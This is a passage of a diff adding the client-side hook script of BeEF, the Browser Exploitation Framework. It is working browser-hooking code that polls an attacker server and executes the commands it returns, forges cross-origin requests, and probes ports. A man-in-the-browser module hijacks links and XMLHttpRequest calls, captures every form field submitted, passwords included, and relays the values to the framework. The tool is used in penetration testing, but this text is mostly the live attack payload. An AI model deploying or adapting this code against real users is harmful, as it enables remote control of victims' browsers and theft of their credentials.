+                response.duration = (end_time - start_time);
+            },
+            error: function (jqXHR, textStatus, errorThrown) {
+                var end_time = new Date().getTime();
+                response.response_body = jqXHR.responseText;
+                response.status_code = jqXHR.status;
+                response.status_text = textStatus;
+                response.duration = (end_time - start_time);
+                response.port_status = "open";
+            },
+            complete: function (jqXHR, textStatus) {
+                response.status_code = jqXHR.status;
+                response.status_text = textStatus;
+                response.headers = jqXHR.getAllResponseHeaders();
+                // determine if TCP port is open/closed/not-http
+                if (textStatus == "timeout") {
+                    response.was_timedout = true;
+                    response.response_body = "ERROR: Timed out\n";
+                    response.port_status = "closed";
+                } else if (textStatus == "parsererror") {
+                    response.port_status = "not-http";
+                } else {
+                    response.port_status = "open";
+                }
+            }
+        }).always(function () {
+                if (callback != null) {
+                    callback(response);
+                }
+            });
+        return response;
+    },
+
+    /**
+     * Similar to beef.net.request, except from a few things that are needed when dealing with forged requests:
+     *  - requestid: needed on the callback
+     *  - allowCrossOrigin: set cross-origin requests as allowed or blocked
+     *
+     * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
+     * Example usage:
+     * beef.net.forge_request("http", "POST", "172.20.40.50", 8080, "/lulz",
+     *   true, null, { foo: "bar" }, 5, 'html', false, null, function(response) {
+     *   alert(response.response_body)})
+     */
+    forge_request: function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossOrigin, requestid, callback) {
+
+        if (domain == "undefined" || path == "undefined") {
+            beef.debug("[beef.net.forge_request] Error: Malformed request. No host specified.");
+            return;
+        }
+
+        // check if same origin or cross origin
+        var cross_origin = true;
+        if (document.domain == domain && document.location.protocol == scheme + ':') {
+            if (document.location.port == "" || document.location.port == null) {
+                cross_origin = !(port == "80" || port == "443");
+            } else {
+                if (document.location.port == port) cross_origin = false;
+            }
+        }
+
+        // build the url
+        var url = "";
+        if (path.indexOf("http://") != -1 || path.indexOf("https://") != -1) {
+            url = path;
+        } else {
+            url = scheme + "://" + domain;
+            url = (port != null) ? url + ":" + port : url;
+            url = (path != null) ? url + path : url;
+            url = (anchor != null) ? url + "#" + anchor : url;
+        }
+
+        // define response object
+        var response = new this.response;
+        response.was_cross_origin = cross_origin;
+        var start_time = new Date().getTime();
+
+        // if cross-origin requests are not allowed and the request is cross-origin
+        // don't proceed and return
+        if (allowCrossOrigin == "false" && cross_origin) {
+            beef.debug("[beef.net.forge_request] Error: Cross Domain Request. The request was not sent.");
+            response.status_code = -1;
+            response.status_text = "crossorigin";
+            response.port_status = "crossorigin";
+            response.response_body = "ERROR: Cross Domain Request. The request was not sent.\n";
+            response.headers = "ERROR: Cross Domain Request. The request was not sent.\n";
+            if (callback != null) callback(response, requestid);
+            return response;
+        }
+
+        // if the request was cross-origin from a HTTPS origin to HTTP
+        // don't proceed and return
+        if (document.location.protocol == 'https:' && scheme == 'http') {
+            beef.debug("[beef.net.forge_request] Error: Mixed Active Content. The request was not sent.");
+            response.status_code = -1;
+            response.status_text = "mixedcontent";
+            response.port_status = "mixedcontent";
+            response.response_body = "ERROR: Mixed Active Content. The request was not sent.\n";
+            response.headers = "ERROR: Mixed Active Content. The request was not sent.\n";
+            if (callback != null) callback(response, requestid);
+            return response;
+        }
+
+        /*
+         * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
+         * This will turn POSTs into GETs for cross origin requests.
+         */
+        if (method == "POST") {
+            $j.ajaxSetup({
+                dataType: dataType
+            });
+        } else {
+            $j.ajaxSetup({
+                dataType: 'script'
+            });
+        }
+
+        // this is required for bugs in IE so data can be transferred back to the server
+        if (beef.browser.isIE()) {
+            dataType = 'script'
+        }
+
+        $j.ajax({type: method,
+            dataType: dataType,
+            url: url,
+            headers: headers,
+            timeout: (timeout * 1000),
+
+            //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
+            beforeSend: function (xhr) {
+                if (method == "POST") {
+                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
+                }
+            },
+
+            data: data,
+
+            // http server responded successfully
+            success: function (data, textStatus, xhr) {
+                var end_time = new Date().getTime();
+                response.status_code = xhr.status;
+                response.status_text = textStatus;
+                response.response_body = data;
+                response.was_timedout = false;
+                response.duration = (end_time - start_time);
+            },
+
+            // server responded with a http error (403, 404, 500, etc)
+            // or server is not a http server
+            error: function (xhr, textStatus, errorThrown) {
+                var end_time = new Date().getTime();
+                response.response_body = xhr.responseText;
+                response.status_code = xhr.status;
+                response.status_text = textStatus;
+                response.duration = (end_time - start_time);
+            },
+
+            complete: function (xhr, textStatus) {
+                // cross-origin request
+                if (cross_origin) {
+
+                    response.port_status = "crossorigin";
+
+                    if (xhr.status != 0) {
+                        response.status_code = xhr.status;
+                    } else {
+                        response.status_code = -1;
+                    }
+
+                    if (textStatus) {
+                        response.status_text = textStatus;
+                    } else {
+                        response.status_text = "crossorigin";
+                    }
+
+                    if (xhr.getAllResponseHeaders()) {
+                        response.headers = xhr.getAllResponseHeaders();
+                    } else {
+                        response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
+                    }
+
+                    if (!response.response_body) {
+                        response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
+                    }
+
+                } else {
+                    // same-origin request
+                    response.status_code = xhr.status;
+                    response.status_text = textStatus;
+                    response.headers = xhr.getAllResponseHeaders();
+
+                    // determine if TCP port is open/closed/not-http
+                    if (textStatus == "timeout") {
+                        response.was_timedout = true;
+                        response.response_body = "ERROR: Timed out\n";
+                        response.port_status = "closed";
+                        /*
+                         * With IE we need to explicitly set the dataType to "script",
+                         * so there will be always parse-errors if the content is != javascript
+                         * */
+                    } else if (textStatus == "parsererror") {
+                        response.port_status = "not-http";
+                        if (beef.browser.isIE()) {
+                            response.status_text = "success";
+                            response.port_status = "open";
+                        }
+                    } else {
+                        response.port_status = "open";
+                    }
+                }
+                callback(response, requestid);
+            }
+        });
+        return response;
+    },
+
+    /** this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
+     *  http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
+     */
+    clean: function (r) {
+        if (this.array_has_string_key(r)) {
+            var obj = {};
+            for (var key in r)
+                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
+            return obj;
+        }
+        return r;
+    },
+
+    /** Detects if an array has a string key */
+    array_has_string_key: function (arr) {
+        if ($j.isArray(arr)) {
+            try {
+                for (var key in arr)
+                    if (isNaN(parseInt(key))) return true;
+            } catch (e) {
+            }
+        }
+        return false;
+    },
+
+    /**
+     * Checks if the specified port is valid
+     */
+    is_valid_port: function (port) {
+      if (isNaN(port)) return false;
+      if (port > 65535 || port < 0) return false;
+      return true;
+    },
+
+    /**
+     * Checks if the specified IP address is valid
+     */
+    is_valid_ip: function (ip) {
+      if (ip == null) return false;
+      var ip_match = ip.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
+      if (ip_match == null) return false;
+      return true;
+    },
+
+    /**
+     * Checks if the specified IP address range is valid
+     */
+    is_valid_ip_range: function (ip_range) {
+      if (ip_range == null) return false;
+      var range_match = ip_range.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
+      if (range_match == null || range_match[1] == null) return false;
+      return true;
+    },
+
+    /**
+     * Sends back browser details to framework, calling beef.browser.getDetails()
+     */
+    browser_details: function () {
+        var details = beef.browser.getDetails();
+        var res = null;
+        details['HookSessionID'] = beef.session.get_hook_session_id();
+        this.send('/init', 0, details);
+        if(details != null)
+            res = true;
+
+        return res;
+    }
+
+};
+
+
+beef.regCmp('beef.net');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Object in charge of getting new commands from the BeEF framework and execute them.
+ * The XHR-polling channel is managed here. If WebSockets are enabled,
+ * websocket.js is used instead.
+ * @namespace beef.updater
+ */
+beef.updater = {
+	
+	/** XHR-polling timeout. */ 
+	xhr_poll_timeout: "1000",
+	
+	/** Hook session name. */ 
+    beefhook: "BEEFHOOK",
+	
+	/** A lock. */ 
+	lock: false,
+	
+	/** An object containing all values to be registered and sent by the updater. */
+	objects: new Object(),
+	
+	/**
+	 * Registers an object to always send when requesting new commands to the framework.
+	 * @param {String} key the name of the object.
+	 * @param {String} value the value of that object.
+	 * 
+	 * @example beef.updater.regObject('java_enabled', 'true');
+	 */
+	regObject: function(key, value) {
+		this.objects[key] = escape(value);
+	},
+	
+	// Checks for new commands from the framework and runs them.
+	check: function() {
+		if(this.lock == false) {
+			if (beef.logger.running) {
+				beef.logger.queue();
+			}
+			beef.net.flush();
+			if(beef.commands.length > 0) {
+				this.execute_commands();
+			}else {
+				this.get_commands();    /*Polling*/
+			}
+		}
+        /* The following gives a stupid syntax error in IE, which can be ignored*/
+        setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
+	},
+	
+    /**
+     * Gets new commands from the framework.
+     */
+	get_commands: function() {
+		try {
+			this.lock = true;
+            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
+                if (response.body != null && response.body.length > 0)
+                    beef.updater.execute_commands();
+            });
+		} catch(e) {
+			this.lock = false;
+			return;
+		}
+		this.lock = false;
+	},
+	
+    /**
+     * Executes the received commands, if any.
+     */
+	execute_commands: function() {
+		if(beef.commands.length == 0) return;
+		this.lock = true;
+		while(beef.commands.length > 0) {
+			command = beef.commands.pop();
+			try {
+				command();
+			} catch(e) {
+				beef.debug('execute_commands - command failed to execute: ' + e.message);
+                // prints the command source to be executed, to better trace errors
+                // beef.client_debug must be enabled in the main config
+                beef.debug(command.toString());
+			}
+		}
+		this.lock = false;
+	}
+};
+
+beef.regCmp('beef.updater');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+// Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662
+
+beef.encode = {};
+
+/** 
+ * Base64 code from http://stackoverflow.com/questions/3774622/how-to-base64-encode-inside-of-javascript/3774662#3774662
+ * @namespace beef.encode.base64 
+ */
+beef.encode.base64 = {
+	
+	keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
+    /** 
+     * @memberof beef.encode.base64 
+     * @param {string} input
+     * @return {string}
+     */
+    encode : function (input) {
+        if (window.btoa) {
+           return btoa(unescape(encodeURIComponent(input)));
+        }
+
+        var output = "";
+        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
+        var i = 0;
+
+        input = beef.encode.base64.utf8_encode(input);
+
+        while (i < input.length) {
+
+            chr1 = input.charCodeAt(i++);
+            chr2 = input.charCodeAt(i++);
+            chr3 = input.charCodeAt(i++);
+
+            enc1 = chr1 >> 2;
+            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+            enc4 = chr3 & 63;
+
+            if (isNaN(chr2)) {
+                enc3 = enc4 = 64;
+            } else if (isNaN(chr3)) {
+                enc4 = 64;
+            }
+
+            output = output +
+            this.keyStr.charAt(enc1) + this.keyStr.charAt(enc2) +
+            this.keyStr.charAt(enc3) + this.keyStr.charAt(enc4);
+
+        }
+
+        return output;
+    },
+
+    /** 
+     * @memberof beef.encode.base64 
+     * @param {string} input
+     * @return {string}
+     */
+    decode : function (input) {
+        if (window.atob) {
+            return escape(atob(input));
+        }
+
+        var output = "";
+        var chr1, chr2, chr3;
+        var enc1, enc2, enc3, enc4;
+        var i = 0;
+
+        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+
+        while (i < input.length) {
+
+            enc1 = this.keyStr.indexOf(input.charAt(i++));
+            enc2 = this.keyStr.indexOf(input.charAt(i++));
+            enc3 = this.keyStr.indexOf(input.charAt(i++));
+            enc4 = this.keyStr.indexOf(input.charAt(i++));
+
+            chr1 = (enc1 << 2) | (enc2 >> 4);
+            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+            chr3 = ((enc3 & 3) << 6) | enc4;
+
+            output = output + String.fromCharCode(chr1);
+
+            if (enc3 != 64) {
+                output = output + String.fromCharCode(chr2);
+            }
+            if (enc4 != 64) {
+                output = output + String.fromCharCode(chr3);
+            }
+
+        }
+
+        output = beef.encode.base64.utf8_decode(output);
+
+        return output;
+
+    },
+
+    /** 
+     * @memberof beef.encode.base64 
+     * @param {string} string
+     * @return {string}
+     */
+    utf8_encode : function (string) {
+        string = string.replace(/\r\n/g,"\n");
+        var utftext = "";
+
+        for (var n = 0; n < string.length; n++) {
+
+            var c = string.charCodeAt(n);
+
+            if (c < 128) {
+                utftext += String.fromCharCode(c);
+            }
+            else if((c > 127) && (c < 2048)) {
+                utftext += String.fromCharCode((c >> 6) | 192);
+                utftext += String.fromCharCode((c & 63) | 128);
+            }
+            else {
+                utftext += String.fromCharCode((c >> 12) | 224);
+                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+                utftext += String.fromCharCode((c & 63) | 128);
+            }
+
+        }
+
+        return utftext;
+    },
+    /** 
+     * @memberof beef.encode.base64 
+     * @param {string} utftext
+     * @return {string} 
+     */
+    utf8_decode : function (utftext) {
+        var string = "";
+        var i = 0;
+        var c = c1 = c2 = 0;
+
+        while ( i < utftext.length ) {
+
+            c = utftext.charCodeAt(i);
+
+            if (c < 128) {
+                string += String.fromCharCode(c);
+                i++;
+            }
+            else if((c > 191) && (c < 224)) {
+                c2 = utftext.charCodeAt(i+1);
+                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+                i += 2;
+            }
+            else {
+                c2 = utftext.charCodeAt(i+1);
+                c3 = utftext.charCodeAt(i+2);
+                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
+                i += 3;
+            }
+
+        }
+
+        return string;
+    }
+
+};
+
+beef.regCmp('beef.encode.base64');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/** 
+ * Json code from Brantlye Harris-- http://code.google.com/p/jquery-json/
+ * @namespace beef.encode.json
+ */
+
+beef.encode.json = {
+	/**
+     * @memberof beef.encode.json
+     * @param o 
+     */
+	stringify: function(o) {
+        if (typeof(JSON) == 'object' && JSON.stringify) {
+            // Error on stringifying cylcic structures caused polling to die
+            try {
+                s = JSON.stringify(o);    
+            } catch(error) {
+                // TODO log error / handle cyclic structures? 
+            }
+            return s;
+        }
+        var type = typeof(o);
+    
+        if (o === null)
+            return "null";
+    
+        if (type == "undefined")
+            return '\"\"';
+        
+        if (type == "number" || type == "boolean")
+            return o + "";
+    
+        if (type == "string")
+            return $j.quoteString(o);
+    
+        if (type == 'object')
+        {
+            if (typeof o.toJSON == "function") 
+                return $j.toJSON( o.toJSON() );
+            
+            if (o.constructor === Date)
+            {
+                var month = o.getUTCMonth() + 1;
+                if (month < 10) month = '0' + month;
+
+                var day = o.getUTCDate();
+                if (day < 10) day = '0' + day;
+
+                var year = o.getUTCFullYear();
+                
+                var hours = o.getUTCHours();
+                if (hours < 10) hours = '0' + hours;
+                
+                var minutes = o.getUTCMinutes();
+                if (minutes < 10) minutes = '0' + minutes;
+                
+                var seconds = o.getUTCSeconds();
+                if (seconds < 10) seconds = '0' + seconds;
+                
+                var milli = o.getUTCMilliseconds();
+                if (milli < 100) milli = '0' + milli;
+                if (milli < 10) milli = '0' + milli;
+
+                return '"' + year + '-' + month + '-' + day + 'T' +
+                             hours + ':' + minutes + ':' + seconds + 
+                             '.' + milli + 'Z"'; 
+            }
+
+            if (o.constructor === Array) 
+            {
+                var ret = [];
+                for (var i = 0; i < o.length; i++)
+                    ret.push( $j.toJSON(o[i]) || "null" );
+
+                return "[" + ret.join(",") + "]";
+            }
+        
+            var pairs = [];
+            for (var k in o) {
+                var name;
+                var type = typeof k;
+
+                if (type == "number")
+                    name = '"' + k + '"';
+                else if (type == "string")
+                    name = $j.quoteString(k);
+                else
+                    continue;  //skip non-string or number keys
+            
+                if (typeof o[k] == "function") 
+                    continue;  //skip pairs where the value is a function.
+            
+                var val = $j.toJSON(o[k]);
+            
+                pairs.push(name + ":" + val);
+            }
+
+            return "{" + pairs.join(", ") + "}";
+        }
+    },
+    /**
+     * @memberof beef.encode.json
+     * @param string 
+     */
+    quoteString: function(string) {
+        if (string.match(this._escapeable))
+        {
+            return '"' + string.replace(this._escapeable, function (a) 
+            {
+                var c = this._meta[a];
+                if (typeof c === 'string') return c;
+                c = a.charCodeAt();
+                return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
+            }) + '"';
+        }
+        return '"' + string + '"';
+    },
+    
+    _escapeable: /["\\\x00-\x1f\x7f-\x9f]/g,
+    
+    _meta : {
+        '\b': '\\b',
+        '\t': '\\t',
+        '\n': '\\n',
+        '\f': '\\f',
+        '\r': '\\r',
+        '"' : '\\"',
+        '\\': '\\\\'
+    }
+};
+
+$j.toJSON = function(o) {return beef.encode.json.stringify(o);};
+$j.quoteString = function(o) {return beef.encode.json.quoteString(o);};
+
+beef.regCmp('beef.encode.json');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides networking functions for the local/internal network of the zombie.
+ * @namespace beef.net.local
+ */
+beef.net.local = {
+	
+	sock: false,
+	checkJava: false,
+	hasJava: false,
+	
+	/**
+	 * Initializes the java socket. We have to use this method because
+	 * some browsers do not have java installed or it is not accessible.
+	 * in which case creating a socket directly generates an error. So this code
+	 * is invalid:
+	 * sock: new java.net.Socket();
+	 */
+	initializeSocket: function() {
+		if(this.checkJava){	
+			if(!beef.browser.hasJava()) {
+				this.checkJava=True;
+				this.hasJava=False;
+				return -1;
+			}else{
+				this.checkJava=True;
+				this.hasJava=True;
+				return 1;
+			}
+		}
+		else{
+			if(!this.hasJava) return -1;
+			else{	
+				try {
+					this.sock = new java.net.Socket();
+				} catch(e) {
+					return -1;
+				}
+				return 1;
+			}
+		}
+	},
+	
+	/**
+	 * Returns the internal IP address of the zombie.
+	 * @return {String} the internal ip of the zombie.
+	 * @error return -1 if the internal ip cannot be retrieved.
+	 */
+	getLocalAddress: function() {
+		if(!this.hasJava) return false;
+		
+		this.initializeSocket();
+		
+		try {
+			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
+			
+			return this.sock.getLocalAddress().getHostAddress();
+		} catch(e) { return false; }
+	},
+	
+	/**
+	 * Returns the internal hostname of the zombie.
+	 * @return {String} the internal hostname of the zombie.
+	 * @error return -1 if the hostname cannot be retrieved.
+	 */
+	getLocalHostname: function() {
+		if(!this.hasJava) return false;
+		
+		this.initializeSocket();
+		
+		try {
+			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
+			
+			return this.sock.getLocalAddress().getHostName();
+		} catch(e) { return false; }
+	}
+	
+};
+
+beef.regCmp('beef.net.local');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Contains the beef_init() method which starts the BeEF client-side
+ * logic. Also, it overrides the 'onpopstate' and 'onclose' events on the windows object.
+ *
+ * If beef.pageIsLoaded is true, then this JS has been loaded >1 times
+ * and will have a new session id. The new session id will need to know
+ * the brwoser details. So sendback the browser details again.
+ * 
+ * @namespace beef.init
+ */
+
+beef.session.get_hook_session_id();
+
+if (beef.pageIsLoaded) {
+    beef.net.browser_details();
+}
+/**
+ * @memberof beef.init
+ */
+window.onload = function () {
+    beef_init();
+};
+/**
+ * @memberof beef.init
+ */
+window.onpopstate = function (event) {
+    if (beef.onpopstate.length > 0) {
+        event.preventDefault;
+        for (var i = 0; i < beef.onpopstate.length; i++) {
+            var callback = beef.onpopstate[i];
+            try {
+                callback(event);
+            } catch (e) {
+                beef.debug("window.onpopstate - couldn't execute callback: " + e.message);
+            }
+            return false;
+        }
+    }
+};
+/**
+ * @memberof beef.init
+ */
+window.onclose = function (event) {
+    if (beef.onclose.length > 0) {
+        event.preventDefault;
+        for (var i = 0; i < beef.onclose.length; i++) {
+            var callback = beef.onclose[i];
+            try {
+                callback(event);
+            } catch (e) {
+                beef.debug("window.onclose - couldn't execute callback: " + e.message);
+            }
+            return false;
+        }
+    }
+};
+
+/**
+ * Starts the polling mechanism, and initialize various components:
+ *  - browser details (see browser.js) are sent back to the "/init" handler
+ *  - the polling starts (checks for new commands, and execute them)
+ *  - the logger component is initialized (see logger.js)
+ *  - the Autorun Engine is initialized (see are.js)
+ * @memberof beef.init
+ */
+function beef_init() {
+    if (!beef.pageIsLoaded) {
+        beef.pageIsLoaded = true;
+        beef.net.browser_details();
+
+        if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
+            setTimeout(function(){
+                beef.websocket.start();
+                beef.updater.execute_commands();
+                beef.logger.start();
+            }, parseInt(beef.websocket.ws_connect_timeout));
+        }else {
+            beef.net.browser_details();
+            beef.updater.execute_commands();
+            beef.updater.check();
+            beef.logger.start();
+        }
+    }
+}
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * @namespace beef.mitb
+ */
+beef.mitb = {
+
+    cid:null,
+    curl:null,
+
+    /** Initializes */ 
+    init:function (cid, curl) {
+        beef.mitb.cid = cid;
+        beef.mitb.curl = curl;
+        /*Override open method to intercept ajax request*/
+        var hook_file = "/hook.js";
+
+        if (window.XMLHttpRequest && !(window.ActiveXObject)) {
+
+            beef.mitb.sniff("Method XMLHttpRequest.open override");
+            (function (open) {
+                XMLHttpRequest.prototype.open = function (method, url, async, mitb_call) {
+                    // Ignore it and don't hijack it. It's either a request to BeEF (hook file or Dynamic Handler)
+                    // or a request initiated by the MiTB itself.
+                    if (mitb_call || (url.indexOf(hook_file) != -1 || url.indexOf("/dh?") != -1)) {
+                        open.call(this, method, url, async, true);
+                    }else {
+                        var portRegex = new RegExp(":[0-9]+");
+                        var portR = portRegex.exec(url);
+                        var requestPort;
+                        if (portR != null) { requestPort = portR[0].split(":")[1]; }
+
+                        //GET request
+                        if (method == "GET") {
+                            //GET request -> cross-origin
+                            if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port )) {
+                                beef.mitb.sniff("GET [Ajax CrossOrigin Request]: " + url);
+                                window.open(url);
+                            }else { //GET request -> same-origin
+                                beef.mitb.sniff("GET [Ajax Request]: " + url);
+                                if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
+                                    var title = "";
+                                    if (document.getElementsByTagName("title").length == 0) {
+                                        title = document.title;
+                                    } else {
+                                        title = document.getElementsByTagName("title")[0].innerHTML;
+                                    }
+                                    // write the url of the page
+                                    history.pushState({ Be:"EF" }, title, url);
+                                }
+                            }
+                        }else{
+                            //POST request
+                            beef.mitb.sniff("POST ajax request to: " + url);
+                            open.call(this, method, url, async, true);
+                        }
+                    }
+                };
+            })(XMLHttpRequest.prototype.open);
+        }
+    },
+
+    /** Initializes the hook on anchors and forms. */ 
+    hook:function () {
+        beef.onpopstate.push(function (event) {
+            beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);
+        });
+        beef.onclose.push(function (event) {
+            beef.mitb.endSession();
+        });
+
+        var anchors = document.getElementsByTagName("a");
+        var forms = document.getElementsByTagName("form");
+        var lis = document.getElementsByTagName("li");
+
+        for (var i = 0; i < anchors.length; i++) {
+            anchors[i].onclick = beef.mitb.poisonAnchor;
+        }
+        for (var i = 0; i < forms.length; i++) {
+            beef.mitb.poisonForm(forms[i]);
+        }
+
+        for (var i = 0; i < lis.length; i++) {
+            if (lis[i].hasAttribute("onclick")) {
+                lis[i].removeAttribute("onclick");
+                /*clear*/
+                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
+                /*override*/
+
+            }
+        }
+    },
+
+    /** Hooks anchors and prevents them from linking away */
+    poisonAnchor:function (e) {
+        try {
+            e.preventDefault;
+            if (beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])) {
+                var title = "";
+                if (document.getElementsByTagName("title").length == 0) {
+                    title = document.title;
+                } else {
+                    title = document.getElementsByTagName("title")[0].innerHTML;
+                }
+                history.pushState({ Be:"EF" }, title, e.currentTarget);
+            }
+        } catch (e) {
+            beef.debug('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
+        }
+        return false;
+    },
+
+    /** Hooks forms and prevents them from linking away */
+    poisonForm:function (form) {
+        form.onsubmit = function (e) {
+
+            // Collect <input> tags.
+            var inputs = form.getElementsByTagName("input");
+            var query = "";
+            for (var i = 0; i < inputs.length; i++) {
+                switch (inputs[i].type) {
+                    case "submit":
+                        break;
+                    default:
+                        query += inputs[i].name + "=" + inputs[i].value + '&';
+                        break;
+                }
+            }
+
+            // Collect selected options from the form.
+            var selects = form.getElementsByTagName("select");
+            for (var i = 0; i < selects.length; i++) {
+                var select = selects[i];
+                query += select.name + "=" + select.options[select.selectedIndex].value + '&';
+            }
+
+            // We should be gathering 'submit' inputs as well, as there are 
+            // applications demanding this parameter.
+            var submit = $j('*[type="submit"]', form);
+            if(submit.length) {
+                // Append name of the submit button/input.
+                query += submit.attr('name') + '=' + submit.attr('value');
+            }
+
+            if(query.slice(-1) == '&') {
+                query = query.slice(0, -1);
+            }
+
+            e.preventdefault;
+            beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
+            history.pushState({ Be:"EF" }, "", form.action);
+            return false;
+        }
+    },
+
+    /** Fetches a hooked form with AJAX */ 
+    fetchForm:function (url, query, target) {
+        try {
+            var y = new XMLHttpRequest();
+            y.open('POST', url, false, true);
+            y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 && y.responseText != "") {
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            };
+            y.send(query);
+            beef.mitb.sniff("POST: " + url + "[" + query + "]");
+            return true;
+        } catch (x) {
+            return false;
+        }
+    },
+
+    /** Fetches a hooked link with AJAX */
+    fetch:function (url, target) {
+        try {
+            var y = new XMLHttpRequest();
+            y.open('GET', url, false, true);
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 && y.responseText != "") {
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            };
+            y.send(null);
+            beef.mitb.sniff("GET: " + url);
+            return true;
+        } catch (x) {
+            window.open(url);
+            beef.mitb.sniff("GET [New Window]: " + url);
+            return false;
+        }
+    },
+
+    /** Fetches a window.location=http://domainname.com and setting up history */ 
+    fetchOnclick:function (url) {
+        try {
+            var target = document.getElementsByTagName("html")[0];
+            var y = new XMLHttpRequest();
+            y.open('GET', url, false, true);
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 && y.responseText != "") {
+                    var title = "";
+                    if (document.getElementsByTagName("title").length == 0) {
+                        title = document.title;
+                    }
+                    else {
+                        title = document.getElementsByTagName("title")[0].innerHTML;
+                        }
+                    history.pushState({ Be:"EF" }, title, url);
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            };
+            y.send(null);
+            beef.mitb.sniff("GET: " + url);
+
+        } catch (x) {
+            // the link is cross-origin, so load the resource in a different tab
+            window.open(url);
+            beef.mitb.sniff("GET [New Window]: " + url);
+        }
+    },
+
+    /** Relays an entry to the framework */
+    sniff:function (result) {
+        try {
+            beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
+        } catch (x) {
+        }
+        return true;
+    },
+
+    /** Signals the Framework that the user has lost the hook */
+    endSession:function () {
+        beef.mitb.sniff("Window closed.");
+    }
+};
+
+beef.regCmp('beef.mitb');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides functionalities to use the geolocation API.
+ * @namespace beef.geolocation
+ */
